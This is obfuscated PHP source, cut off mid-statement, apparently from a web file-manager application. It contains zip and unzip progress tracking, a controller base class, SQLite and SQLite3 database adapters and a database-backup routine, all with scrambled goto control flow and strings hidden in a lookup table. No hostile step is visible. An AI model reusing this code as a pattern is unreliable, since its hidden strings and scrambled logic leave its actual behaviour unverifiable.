D·Í–¶Ùõ§; DÇ”…–‘Áó: $CŞŠºˆí‘[$A›´îÉˆã[1483]] = $FÑÜì–‰Ù£[$A›´îÉˆã[28]]; $CŞŠºˆí‘[$A›´îÉˆã[1485]] = $FÑÜì–‰Ù£[$A›´îÉˆã[87]]; $CŞŠºˆí‘[$A›´îÉˆã[1486]] = 0; goto aîÙŸœÂÂ; AŒöŒ®óˆ: $A›´îÉˆã =& $_SERVER[¶ªÕß‚ØÁŸ]; $CŞŠºˆí‘ =& $this->task; $FÑÜì–‰Ù£ = IO::info($aƒ¶†Õß); goto DÇ”…–‘Áó; D·Í–¶Ùõ§: $CŞŠºˆí‘[$A›´îÉˆã[982]] = 1; $cò¤¥×äÑ = 0; $CŞŠºˆí‘[$A›´îÉˆã[1494]] = array($A›´îÉˆã[1495] => $cò¤¥×äÑ + 1, $A›´îÉˆã[394] => $FÑÜì–‰Ù£[$A›´îÉˆã[28]], $A›´îÉˆã[85] => $FÑÜì–‰Ù£[$A›´îÉˆã[85]], $A›´îÉˆã[474] => $FÑÜì–‰Ù£[$A›´îÉˆã[474]] ? $FÑÜì–‰Ù£[$A›´îÉˆã[474]] : $FÑÜì–‰Ù£[$A›´îÉˆã[85]]); goto Aƒ¶Î®àÌÜ; b»ĞÊ‰À¯Ö: } public function unzipAfter($eâï‡®˜£¤) { goto c–‡ê¢ˆ‘Ë; DºŸ³Òç: $E§©·ŞòŸ§[$EÑÊİæÇêí[1483]] = $EÑÊİæÇêí[33]; $E§©·ŞòŸ§[$EÑÊİæÇêí[1490]] = 0; $E§©·ŞòŸ§[$EÑÊİæÇêí[711]] = $Eøø¥œÓ‹[$EÑÊİæÇêí[87]]; goto cï”÷Œ„°ó; bŞ¿ò¾¥±Í: $Eøø¥œÓ‹ = IO::infoWithChildren($eâï‡®˜£¤); $BÂ¸ÈíĞ±¹ = 0; $E§©·ŞòŸ§[$EÑÊİæÇêí[1494]] = array($EÑÊİæÇêí[1495] => $BÂ¸ÈíĞ±¹ + 1, $EÑÊİæÇêí[394] => $Eøø¥œÓ‹[$EÑÊİæÇêí[28]], $EÑÊİæÇêí[85] => $Eøø¥œÓ‹[$EÑÊİæÇêí[85]], $EÑÊİæÇêí[474] => $Eøø¥œÓ‹[$EÑÊİæÇêí[474]] ? $Eøø¥œÓ‹[$EÑÊİæÇêí[474]] : $Eøø¥œÓ‹[$EÑÊİæÇêí[85]]); goto dàÃù£‰â²; cï”÷Œ„°ó: $this->update(); self::log($EÑÊİæÇêí[1515] . json_encode(array($E§©·ŞòŸ§, $Eøø¥œÓ‹))); goto fÒ¹®´àêê; dàÃù£‰â²: if ($Eøø¥œÓ‹[$EÑÊİæÇêí[29]] == $EÑÊİæÇêí[177]) { $E§©·ŞòŸ§[$EÑÊİæÇêí[982]] = 1; } else { $E§©·ŞòŸ§[$EÑÊİæÇêí[982]] = $Eøø¥œÓ‹[$EÑÊİæÇêí[90]][$EÑÊİæÇêí[88]]; } $E§©·ŞòŸ§[$EÑÊİæÇêí[984]] = $EÑÊİæÇêí[33]; $E§©·ŞòŸ§[$EÑÊİæÇêí[1487]] = 0; goto FŒ²Å£í£Š; c–‡ê¢ˆ‘Ë: $EÑÊİæÇêí =& $_SERVER[¶ªÕß‚ØÁŸ]; $E§©·ŞòŸ§ =& $this->task; $E§©·ŞòŸ§[$EÑÊİæÇêí[1513]] = $EÑÊİæÇêí[113]; goto bŞ¿ò¾¥±Í; FŒ²Å£í£Š: $E§©·ŞòŸ§[$EÑÊİæÇêí[994]] = 0; $E§©·ŞòŸ§[$EÑÊİæÇêí[1485]] = 0; $E§©·ŞòŸ§[$EÑÊİæÇêí[1486]] = 0; goto DºŸ³Òç; fÒ¹®´àêê: } public function nameParse($A»Ğï—äïã) { goto bö¨á™š›ò; d’ññôç­â: $this->update(); goto C‡ìÉÌ°…¾; Eöé÷”‰Ä˜: $c¾¥õ‹ïç = get_path_this($A»Ğï—äïã); if (strstr($c¾¥õ‹ïç, $c„Üã÷®[101])) { $dëŞÜ¸Ñ¨ï[$c„Üã÷®[994]] += 1; $dëŞÜ¸Ñ¨ï[$c„Üã÷®[982]] += 1; } $dëŞÜ¸Ñ¨ï[$c„Üã÷®[1483]] = $A»Ğï—äïã; goto d’ññôç­â; bö¨á™š›ò: $c„Üã÷® =& $_SERVER[¶ªÕß‚ØÁŸ]; $dëŞÜ¸Ñ¨ï =& $this->task; if ($dëŞÜ¸Ñ¨ï[$c„Üã÷®[1513]] == $c„Üã÷®[1044]) { $dëŞÜ¸Ñ¨ï[$c„Üã÷®[1513]] = $c„Üã÷®[310]; $dëŞÜ¸Ñ¨ï[$c„Üã÷®[1490]] = 0; $dëŞÜ¸Ñ¨ï[$c„Üã÷®[711]] = 0; } goto Eöé÷”‰Ä˜; C‡ìÉÌ°…¾: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $b±öš©ŠøÑ =& $_SERVER[¶ªÕß‚ØÁŸ]; parent::startAfter(); Hook::bind($b±öš©ŠøÑ[1516], array($this, $b±öš©ŠøÑ[1511])); $c„êğöÅê =& $this->task; $c„êğöÅê[$b±öš©ŠøÑ[1513]] = $b±öš©ŠøÑ[1044]; if (!$c„êğöÅê[$b±öš©ŠøÑ[1346]]) { $c„êğöÅê[$b±öš©ŠøÑ[1346]] = LNG($b±öš©ŠøÑ[1517]); } } protected function endAfter() { $CÄÏß§¸•Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; parent::endAfter(); Hook::unbind($CÄÏß§¸•Œ[1516], array($this, $CÄÏß§¸•Œ[1511])); } public function updateAfter() { $a“•¥ÂñÙå =& $_SERVER[¶ªÕß‚ØÁŸ]; $Fœç¸ˆ¼ß =& $this->task; if (!$Fœç¸ˆ¼ß[$a“•¥ÂñÙå[982]] || !$Fœç¸ˆ¼ß[$a“•¥ÂñÙå[711]]) { return; } if ($Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1513]] == $a“•¥ÂñÙå[1044]) { $d‘˜–ì…ç = $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1486]]; if ($Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1487]] != $a“•¥ÂñÙå[1044]) { $d‘˜–ì…ç = 0; } $F¡¸ˆœ‚ = ($Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1490]] + $d‘˜–ì…ç) / $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[711]]; $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1441]] = $F¡¸ˆœ‚ * 0.3; } else { if ($Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1513]] == $a“•¥ÂñÙå[310]) { $F¡¸ˆœ‚ = $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[994]] / $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[982]]; $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1441]] = 0.3 + $F¡¸ˆœ‚ * 0.5; } else { if ($Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1513]] == $a“•¥ÂñÙå[113]) { $F¡¸ˆœ‚ = 0; if ($Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1485]]) { $F¡¸ˆœ‚ = $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1486]] / $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1485]]; } $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1441]] = 0.3 + 0.5 + $F¡¸ˆœ‚ * 0.2; } } } if ($Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1441]] > 0) { $B„Šîö¬ìÁ = timeFloat() - $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1443]] - $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1446]]; $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1447]] = $B„Šîö¬ìÁ * (1 - $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1441]]) / $Fœç¸ˆ¼ß[$a“•¥ÂñÙå[1441]]; } } public function copyFileStart($cî·Œ‡çØ„, $B»„å‚¦, $f¹ØšÄœ¼£, $AÃé—İ½, $E‰Ä‡åƒ“È, $B‰÷„´Éìˆ) { $eäÅÕ“ôÈ =& $_SERVER[¶ªÕß‚ØÁŸ]; parent::copyFileStart($cî·Œ‡çØ„, $B»„å‚¦, $f¹ØšÄœ¼£, $AÃé—İ½, $E‰Ä‡åƒ“È, $B‰÷„´Éìˆ); $fŠß‰à‰… =& $this->task; if ($fŠß‰à‰…[$eäÅÕ“ôÈ[1513]] == $eäÅÕ“ôÈ[310]) { $fŠß‰à‰…[$eäÅÕ“ôÈ[1513]] = $eäÅÕ“ôÈ[113]; } $this->update(); } public function copyFileEnd($D†‡ïº²É, $aÁÒ£’Ü, $A¶¶È¢ İÇ, $Dùï´¨ŒØÕ, $Eõ£œœ˜Æ, $FÅéò£¹‰˜) { $d¤Ñš‹÷Šò =& $_SERVER[¶ªÕß‚ØÁŸ]; $bìê´°êß =& $this->task; $bìê´°êß[$d¤Ñš‹÷Šò[1486]] = $bìê´°êß[$d¤Ñš‹÷Šò[1485]]; $bìê´°êß[$d¤Ñš‹÷Šò[1490]] += $bìê´°êß[$d¤Ñš‹÷Šò[1485]]; $bìê´°êß[$d¤Ñš‹÷Šò[1487]] = $d¤Ñš‹÷Šò[33]; $this->update(); } public function nameParse($cÅœ§ÆÜó¹) { $aİ†áĞæí =& $_SERVER[¶ªÕß‚ØÁŸ]; $CĞÑË¼Ÿ‘¹ =& $this->task; if ($CĞÑË¼Ÿ‘¹[$aİ†áĞæí[994]] < $CĞÑË¼Ÿ‘¹[$aİ†áĞæí[982]]) { $BßÍ¡Ö¾ = get_path_this($cÅœ§ÆÜó¹); if (strstr($BßÍ¡Ö¾, $aİ†áĞæí[101])) { $CĞÑË¼Ÿ‘¹[$aİ†áĞæí[994]] += 1; } } if ($CĞÑË¼Ÿ‘¹[$aİ†áĞæí[1513]] == $aİ†áĞæí[1044]) { $CĞÑË¼Ÿ‘¹[$aİ†áĞæí[1513]] = $aİ†áĞæí[310]; } $CĞÑË¼Ÿ‘¹[$aİ†áĞæí[1483]] = $cÅœ§ÆÜó¹; $this->update(); } } goto eååÑ‚î¸÷; BìĞã¤‰»õ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto CàÅà²ƒÆ•; cˆ—…«£Íö: $this->tpl = TEMPLATE . MOD . $B­‰³›Ë¡[8]; $this->_classObjectID = mt_rand(0, 10000); goto f—ØÉ®Ëõ; CàÅà²ƒÆ•: $B­‰³›Ë¡ =& $_SERVER[¶ªÕß‚ØÁŸ]; global $in, $config; $this->config =& $config; goto E«¿²¡Ì¬ç; E«¿²¡Ì¬ç: $this->in =& $in; $this->values[$B­‰³›Ë¡[6]] =& $config; $this->values[$B­‰³›Ë¡[7]] =& $in; goto cˆ—…«£Íö; f—ØÉ®Ëõ: } public function loadClass($Fê¿µß¾œ) { if (1 === func_num_args()) { $this->{$Fê¿µß¾œ} = new $Fê¿µß¾œ(); } else { $D‰ì±‰ÃÖ = new ReflectionClass($Fê¿µß¾œ); $dÃ¬ËšÀÓ = func_get_args(); array_shift($dÃ¬ËšÀÓ); $this->{$Fê¿µß¾œ} = $D‰ì±‰ÃÖ->newInstanceArgs($dÃ¬ËšÀÓ); } return $this->{$Fê¿µß¾œ}; } protected function assign($dÏ¿ƒÂ¢Ùˆ, $fÆÆ¿É¿‰À) { $this->values[$dÏ¿ƒÂ¢Ùˆ] = $fÆÆ¿É¿‰À; } protected function display($E¸¤…®ë’æ) { ob_end_clean(); extract($this->values); require $this->tpl . $E¸¤…®ë’æ; } } class DbSqliteBase extends Db { public function __construct($DÅåÜµ½«æ = '') { $E‹Ï«ÔÈÎé =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!extension_loaded($E‹Ï«ÔÈÎé[9])) { think_exception(think_lang($E‹Ï«ÔÈÎé[10]) . $E‹Ï«ÔÈÎé[11]); } if (!empty($DÅåÜµ½«æ)) { if (!isset($DÅåÜµ½«æ[$E‹Ï«ÔÈÎé[12]])) { $DÅåÜµ½«æ[$E‹Ï«ÔÈÎé[12]] = 438; } $this->config = $DÅåÜµ½«æ; if (empty($this->config[$E‹Ï«ÔÈÎé[13]])) { $this->config[$E‹Ï«ÔÈÎé[13]] = array(); } } } public function connect($AÈÁªãÂò = '', $Dğ»ŠÍÅÚÁ = 0) { $f¯‹Ùä–Ëî =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($this->linkID[$Dğ»ŠÍÅÚÁ])) { goto fÛ×›Şµ¡æ; eˆ£õÓÂõ¬: $this->linkID[$Dğ»ŠÍÅÚÁ] = $a†àÈˆ£–˜($AÈÁªãÂò[$f¯‹Ùä–Ëî[17]], $AÈÁªãÂò[$f¯‹Ùä–Ëî[12]]); if (!$this->linkID[$Dğ»ŠÍÅÚÁ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto bÏö¾‚™ÉÇ; fÛ×›Şµ¡æ: if (empty($AÈÁªãÂò)) { $AÈÁªãÂò = $this->config; } $DÁ£ÙÀàó« = !empty($AÈÁªãÂò[$f¯‹Ùä–Ëî[13]][$f¯‹Ùä–Ëî[14]]) ? $AÈÁªãÂò[$f¯‹Ùä–Ëî[13]][$f¯‹Ùä–Ëî[14]] : $this->pconnect; $a†àÈˆ£–˜ = $DÁ£ÙÀàó« ? $f¯‹Ùä–Ëî[15] : $f¯‹Ùä–Ëî[16]; goto eˆ£õÓÂõ¬; bÏö¾‚™ÉÇ: @sqlite_busy_timeout($this->linkID[$Dğ»ŠÍÅÚÁ], 30000); if (1 != think_config($f¯‹Ùä–Ëî[18])) { unset($this->config); } goto cíä·—àœ‹; cíä·—àœ‹: } return $this->linkID[$Dğ»ŠÍÅÚÁ]; } public function free() { $this->queryID = null; } public function query($EôÙ®Ğ‡íå) { goto e™ÉøŒĞñ¬; a°È§ƒĞÂ«: think_status($fˆÆõ«ˆºÎ[20]); $this->queryID = sqlite_query($this->_linkID, $EôÙ®Ğ‡íå); $this->debug(); goto dÔ³ÂƒğĞñ; dÔ³ÂƒğĞñ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $C™°µ­©¾± = $this->getAll(); return $C™°µ­©¾±; } goto dš‡ÔŠ…˜ø; aÛÚ„Šˆôâ: $this->queryStr = $EôÙ®Ğ‡íå; if ($this->queryID) { $this->free(); } think_action_status($fˆÆõ«ˆºÎ[19], 1); goto a°È§ƒĞÂ«; e™ÉøŒĞñ¬: $fˆÆõ«ˆºÎ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aÛÚ„Šˆôâ; dš‡ÔŠ…˜ø: } public function execute($BÛ²‹Å± ½) { goto F‚âÆÂñ‡š; F‚âÆÂñ‡š: $EÔ”©ÈÎ¨š =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÑâÓŞ–; D¤‡»´Ìé•: think_status($EÔ”©ÈÎ¨š[20]); $Cïšìô ¨ = sqlite_exec($this->_linkID, $BÛ²‹Å± ½); $this->debug(); goto e Ï‡«¥òê; e Ï‡«¥òê: if (!1 === $Cïšìô ¨) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto B˜‰Ì½ÌÍ; BÑâÓŞ–: $this->queryStr = $BÛ²‹Å± ½; if ($this->queryID) { $this->free(); } think_action_status($EÔ”©ÈÎ¨š[21], 1); goto D¤‡»´Ìé•; B˜‰Ì½ÌÍ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¶ªÕß‚ØÁŸ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c“ÍÙ¯§Ì = sqlite_query($this->_linkID, $_SERVER[¶ªÕß‚ØÁŸ][23]); if (!$c“ÍÙ¯§Ì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Eùò‚¡’ = sqlite_query($this->_linkID, $_SERVER[¶ªÕß‚ØÁŸ][24]); if (!$Eùò‚¡’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $AÂ“™Ğ¬ò¯ = array(); if ($this->numRows > 0) { for ($D–¾ë××ª = 0; $D–¾ë××ª < $this->numRows; $D–¾ë××ª++) { $AÂ“™Ğ¬ò¯[$D–¾ë××ª] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $AÂ“™Ğ¬ò¯; } public function getFields($c£Õ–¥¾„) { $dí™×ÌÅ ó =& $_SERVER[¶ªÕß‚ØÁŸ]; $a¨ÈÌÉË· = $this->query($dí™×ÌÅ ó[25] . $c£Õ–¥¾„ . $dí™×ÌÅ ó[26]); $eË¶­ÎÁù = array(); if ($a¨ÈÌÉË·) { foreach ($a¨ÈÌÉË· as $Béò‚·ø¸İ => $eŞ‹Ù˜¢àï) { $eË¶­ÎÁù[$eŞ‹Ù˜¢àï[$dí™×ÌÅ ó[27]]] = array($dí™×ÌÅ ó[28] => $eŞ‹Ù˜¢àï[$dí™×ÌÅ ó[27]], $dí™×ÌÅ ó[29] => $eŞ‹Ù˜¢àï[$dí™×ÌÅ ó[30]], $dí™×ÌÅ ó[31] => (bool) ($eŞ‹Ù˜¢àï[$dí™×ÌÅ ó[32]] === $dí™×ÌÅ ó[33]), $dí™×ÌÅ ó[34] => $eŞ‹Ù˜¢àï[$dí™×ÌÅ ó[35]], $dí™×ÌÅ ó[36] => strtolower($eŞ‹Ù˜¢àï[$dí™×ÌÅ ó[37]]) == $dí™×ÌÅ ó[38], $dí™×ÌÅ ó[39] => strtolower($eŞ‹Ù˜¢àï[$dí™×ÌÅ ó[40]]) == $dí™×ÌÅ ó[41]); } } return $eË¶­ÎÁù; } public function getTables($dÇ‰ÌÔÆÉ¶ = '') { $bŞã„Â”¦Ş =& $_SERVER[¶ªÕß‚ØÁŸ]; $f¦œõÓ§¿¢ = $this->query($bŞã„Â”¦Ş[42] . $bŞã„Â”¦Ş[43] . $bŞã„Â”¦Ş[44]); $E™Ñì¸ƒµŒ = array(); foreach ($f¦œõÓ§¿¢ as $dò»”‘±Ùˆ => $B–ªœÀ‡ì) { $E™Ñì¸ƒµŒ[$dò»”‘±Ùˆ] = current($B–ªœÀ‡ì); } return $E™Ñì¸ƒµŒ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $eŠ‚‘åè« =& $_SERVER[¶ªÕß‚ØÁŸ]; $AãŠ”ñÖ· = sqlite_last_error($this->_linkID); $this->error = $AãŠ”ñÖ· . $eŠ‚‘åè«[4] . sqlite_error_string($AãŠ”ñÖ·); if ($eŠ‚‘åè«[33] != $this->queryStr) { $this->error .= LNG($eŠ‚‘åè«[45]) . $this->queryStr; } think_trace($this->error, $eŠ‚‘åè«[33], $eŠ‚‘åè«[46]); return $this->error; } public function escapeString($cù—¦ÓÙ•) { return sqlite_escape_string($cù—¦ÓÙ•); } public function parseLimit($EŠƒÒ‚») { $dĞÇ…Ğï«¦ =& $_SERVER[¶ªÕß‚ØÁŸ]; $B¯¸à›î¾ã = $dĞÇ…Ğï«¦[33]; if (!empty($EŠƒÒ‚»)) { $EŠƒÒ‚» = explode($dĞÇ…Ğï«¦[47], $EŠƒÒ‚»); if (count($EŠƒÒ‚») > 1) { $B¯¸à›î¾ã .= $dĞÇ…Ğï«¦[48] . $EŠƒÒ‚»[1] . $dĞÇ…Ğï«¦[49] . $EŠƒÒ‚»[0] . $dĞÇ…Ğï«¦[50]; } else { $B¯¸à›î¾ã .= $dĞÇ…Ğï«¦[48] . $EŠƒÒ‚»[0] . $dĞÇ…Ğï«¦[50]; } } return $B¯¸à›î¾ã; } } class DbSqlite3Base extends Db { public function __construct($e°‹ºÔêÆ = '') { $Bé„ï¤…âÖ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!class_exists($Bé„ï¤…âÖ[51])) { think_exception(think_lang($Bé„ï¤…âÖ[10]) . $Bé„ï¤…âÖ[52]); } if (!empty($e°‹ºÔêÆ)) { if (!isset($e°‹ºÔêÆ[$Bé„ï¤…âÖ[12]])) { $e°‹ºÔêÆ[$Bé„ï¤…âÖ[12]] = 438; } $this->config = $e°‹ºÔêÆ; if (empty($this->config[$Bé„ï¤…âÖ[13]])) { $this->config[$Bé„ï¤…âÖ[13]] = array(); } } } public function connect($dó¹ÂË“À = '', $b¿¯¡¿è¥à = 0) { $A´š‡íœ° =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!isset($this->linkID[$b¿¯¡¿è¥à])) { if (empty($dó¹ÂË“À)) { $dó¹ÂË“À = $this->config; } $this->linkID[$b¿¯¡¿è¥à] = new SQLite3($dó¹ÂË“À[$A´š‡íœ°[17]]); if (!$this->linkID[$b¿¯¡¿è¥à]) { think_exception($this->linkID[$b¿¯¡¿è¥à]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$b¿¯¡¿è¥à]->busyTimeout(30000); if (1 != think_config($A´š‡íœ°[18])) { unset($this->config); } } return $this->linkID[$b¿¯¡¿è¥à]; } public function free() { $this->queryID = null; } public function query($C´¾†ŠÍÖÚ) { goto cùˆÚ‹İî™; BÊÜˆ„ó…Ü: $this->queryStr = $C´¾†ŠÍÖÚ; if ($this->queryID) { $this->free(); } think_action_status($B¤ƒÈÔù[19], 1); goto a•ñãĞ·×Ã; a•ñãĞ·×Ã: think_status($B¤ƒÈÔù[20]); $this->queryID = $this->_linkID->query($C´¾†ŠÍÖÚ); $this->debug(); goto b—‘åî‹ÓÁ; cùˆÚ‹İî™: $B¤ƒÈÔù =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BÊÜˆ„ó…Ü; b—‘åî‹ÓÁ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $eòœê›¯Ó§ = $this->getAll(); $this->numRows = count($eòœê›¯Ó§); return $eòœê›¯Ó§; } goto déĞƒŠ–øÃ; déĞƒŠ–øÃ: } public function execute($AËöçš Îô) { goto CÓ™«ÈššÓ; a¼ÚÎØ–«Å: if (!1 === $Cöô’Ê®™ë) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DÂéİ¾­¾Š; CÓ™«ÈššÓ: $DàôçÆÀƒù =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÏ‘§™È…; dŞ¥½…îš: think_status($DàôçÆÀƒù[20]); $Cöô’Ê®™ë = $this->_linkID->exec($AËöçš Îô); $this->debug(); goto a¼ÚÎØ–«Å; CÏ‘§™È…: $this->queryStr = $AËöçš Îô; if ($this->queryID) { $this->free(); } think_action_status($DàôçÆÀƒù[21], 1); goto dŞ¥½…îš; DÂéİ¾­¾Š: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¶ªÕß‚ØÁŸ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Eæ†ïì“ÕÈ = $this->_linkID->query($_SERVER[¶ªÕß‚ØÁŸ][23]); if (!$Eæ†ïì“ÕÈ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $dôéÅóœõ = $this->_linkID->query($_SERVER[¶ªÕß‚ØÁŸ][24]); if (!$dôéÅóœõ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $c‚è’İºß© = array(); while ($b·Ù×–ªÆ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $c‚è’İºß©[] = $b·Ù×–ªÆ; } $this->queryID->reset(); return $c‚è’İºß©; } public function getFields($DØŞ¤Õ‹„™) { $fåª‡…ß“ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÕº„‘¢ = $this->query($fåª‡…ß“[25] . $DØŞ¤Õ‹„™ . $fåª‡…ß“[26]); $C‘¤ˆ¬ÒÊ = array(); if ($FÕº„‘¢) { foreach ($FÕº„‘¢ as $Dì’Çê¥Å => $aÈ‘ïœ¬Ã†) { $C‘¤ˆ¬ÒÊ[$aÈ‘ïœ¬Ã†[$fåª‡…ß“[28]]] = array($fåª‡…ß“[28] => $aÈ‘ïœ¬Ã†[$fåª‡…ß“[28]], $fåª‡…ß“[29] => $aÈ‘ïœ¬Ã†[$fåª‡…ß“[29]], $fåª‡…ß“[31] => (bool) ($aÈ‘ïœ¬Ã†[$fåª‡…ß“[31]] === $fåª‡…ß“[33]), $fåª‡…ß“[34] => $aÈ‘ïœ¬Ã†[$fåª‡…ß“[53]], $fåª‡…ß“[36] => (bool) $aÈ‘ïœ¬Ã†[$fåª‡…ß“[54]], $fåª‡…ß“[39] => (bool) $aÈ‘ïœ¬Ã†[$fåª‡…ß“[54]]); } } return $C‘¤ˆ¬ÒÊ; } public function getTables($cŠÒ¦¯¶ğõ = '') { $A‘‹ğÎ“—£ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a•¼İ«Öø‡ = $this->query($A‘‹ğÎ“—£[42] . $A‘‹ğÎ“—£[43] . $A‘‹ğÎ“—£[44]); $dÏ¸¶ÎŞ—Õ = array(); foreach ($a•¼İ«Öø‡ as $fÃ ê¡ƒ => $eºÎæßğÃ) { $dÏ¸¶ÎŞ—Õ[$fÃ ê¡ƒ] = current($eºÎæßğÃ); } return $dÏ¸¶ÎŞ—Õ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Dˆ¤õÁğ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->error = $this->_linkID->lastErrorMsg(); if ($Dˆ¤õÁğ[33] != $this->queryStr) { $this->error .= LNG($Dˆ¤õÁğ[45]) . $this->queryStr; } think_trace($this->error, $Dˆ¤õÁğ[33], $Dˆ¤õÁğ[46]); return $this->error; } public function escapeString($b„ä‹Ğ´¾) { $fÎ…­àº² =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($this->_linkID) { return $this->_linkID->escapeString($b„ä‹Ğ´¾); } return str_ireplace($fÎ…­àº²[55], $fÎ…­àº²[56], $b„ä‹Ğ´¾); } public function parseLimit($FµÀ©ì¥•“) { $a¯ÊĞÛñ£· =& $_SERVER[¶ªÕß‚ØÁŸ]; $AĞ¹ŠáÔÑÁ = $a¯ÊĞÛñ£·[33]; if (!empty($FµÀ©ì¥•“)) { $FµÀ©ì¥•“ = explode($a¯ÊĞÛñ£·[47], $FµÀ©ì¥•“); if (count($FµÀ©ì¥•“) > 1) { $AĞ¹ŠáÔÑÁ .= $a¯ÊĞÛñ£·[48] . $FµÀ©ì¥•“[1] . $a¯ÊĞÛñ£·[49] . $FµÀ©ì¥•“[0] . $a¯ÊĞÛñ£·[50]; } else { $AĞ¹ŠáÔÑÁ .= $a¯ÊĞÛñ£·[48] . $FµÀ©ì¥•“[0] . $a¯ÊĞÛñ£·[50]; } } return $AĞ¹ŠáÔÑÁ; } } goto B¥æé²„‰í; Dµ›á°„Ì¥: define($_SERVER[¶ªÕß‚ØÁŸ][1938], 4); define($_SERVER[¶ªÕß‚ØÁŸ][1939], 5); define($_SERVER[¶ªÕß‚ØÁŸ][1940], 16); goto Bçó§Å®ŞÉ; Bãå²µòæò: class BackupDbFile { public function __construct() { } public function index() { goto c¿«Š‰ô‰£; AÄ÷¦™¯Ù›: $EÃ”„Œƒîø->end(); Backup::set(array($eŸÑ´…í´Ç[747] => $AÆ¸©Ü¿›ƒ[$eŸÑ´…í´Ç[87]])); return !0; goto Aõğ´¿áÂ; e­°½¿¸‰Ú: $EÃ”„Œƒîø = new TaskFileTransfer($eŸÑ´…í´Ç[742], $eŸÑ´…í´Ç[727], 0, LNG($eŸÑ´…í´Ç[728]) . $eŸÑ´…í´Ç[420] . LNG($eŸÑ´…í´Ç[730]) . $eŸÑ´…í´Ç[743]); $EÃ”„Œƒîø->addPath($b°¯¥”· ); $AÆ¸©Ü¿›ƒ = IO::infoWithChildren($b°¯¥”· ); goto BšÙ¡½»§¾; e²—“²å: $AİßÕ´÷²Ë = CONTROLLER_DIR . $eŸÑ´…í´Ç[746]; IO::copy($b“‘ÇœÀÏ§, $FÏéïñÜ‹£ . "\142\x61\x63\x6b\165\160\137{$DƒŒãÓ˜°…}\57"); IO::copy($AİßÕ´÷²Ë, $FÏéïñÜ‹£ . "\142\x61\143\153\x75\x70\137{$DƒŒãÓ˜°…}\x2f"); goto AÄ÷¦™¯Ù›; b˜à‡˜Ö‚: $b°¯¥”·  = TEMP_FILES . "\x62\141\x63\x6b\165\x70\x5f{$DƒŒãÓ˜°…}\57"; $FÏéïñÜ‹£ = "\x7b\x69\x6f\72{$Bˆ„ïÁğ²‡[$eŸÑ´…í´Ç[704]]}\x7d\x2f\x64\x61\164\141\142\x61\x73\145\57"; IO::mkdir($FÏéïñÜ‹£ . "\x62\x61\x63\x6b\165\x70\x5f{$DƒŒãÓ˜°…}\57"); goto e­°½¿¸‰Ú; c¿«Š‰ô‰£: $eŸÑ´…í´Ç =& $_SERVER[¶ªÕß‚ØÁŸ]; $Bˆ„ïÁğ²‡ = Backup::get(); $DƒŒãÓ˜°… = $Bˆ„ïÁğ²‡[$eŸÑ´…í´Ç[28]]; goto b˜à‡˜Ö‚; BšÙ¡½»§¾: Backup::set(array($eŸÑ´…í´Ç[744] => $AÆ¸©Ü¿›ƒ[$eŸÑ´…í´Ç[87]])); IO::move($b°¯¥”· , 